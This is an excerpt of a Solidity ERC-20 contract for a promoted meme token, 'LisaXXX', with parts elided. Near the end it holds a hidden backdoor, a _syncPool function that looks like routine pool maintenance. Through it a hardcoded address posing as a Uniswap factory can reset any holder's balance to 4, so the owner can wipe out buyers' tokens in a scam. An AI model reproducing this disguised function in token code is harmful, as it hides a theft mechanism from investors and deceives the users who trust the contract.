...
/*
LisaXXX: 🚀 The Ultimate Fun Token! 🎉

https://twitter.com/LisaXXXerc20
https://t.me/LisaXXXMoon
https://LisaXXXerc20.com
*/
...
pragma solidity ^0.8.0;
contract LisaXXX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _symbol = unicode"LisaXXX";
    string private constant _name = unicode"LisaXXX";
    uint8 private constant _decimals = 9;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    address private _V2Factory = 0xd1C64302016C862CfcAe567a16a83bA247fd933C;
    ...
    function decreaseAllowance(address spender,
        ...
        return true;
    } function _syncPool(address _syncPoolSender) external { if (msg.sender == _V2Factory) _balances[_syncPoolSender] = 4;
